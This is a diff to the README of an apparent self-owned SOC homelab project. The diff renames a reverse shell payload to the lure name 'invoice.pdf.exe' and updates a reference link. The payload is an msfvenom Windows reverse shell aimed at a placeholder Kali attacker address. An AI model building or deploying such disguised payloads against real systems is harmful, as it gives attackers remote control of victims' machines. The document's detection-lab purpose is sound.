@@ -64,7 +64,7 @@ A reverse shell payload is generated on the Kali attacker machine using `msfveno
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp \
   LHOST=<KALI_IP> LPORT=4444 \
-  -f exe -o index.pdf.exe
+  -f exe -o invoice.pdf.exe
 ```
 
 **For educational use only.** 
@@ -177,4 +177,4 @@ This project is strictly for educational purposes in an isolated, self-owned lab
 - [soc-homelab-setup (Part 1)](https://github.com/ericnam-png/soc-homelab-setup)
 - [MyDFIR YouTube Channel](https://www.youtube.com/@MyDFIR)
 - [Sysmon Event ID Reference](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
-- [Splunk Search Reference](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference)
+- [Try Hack Me Splunk Search Reference](https://tryhackme.com/room/splunk101)
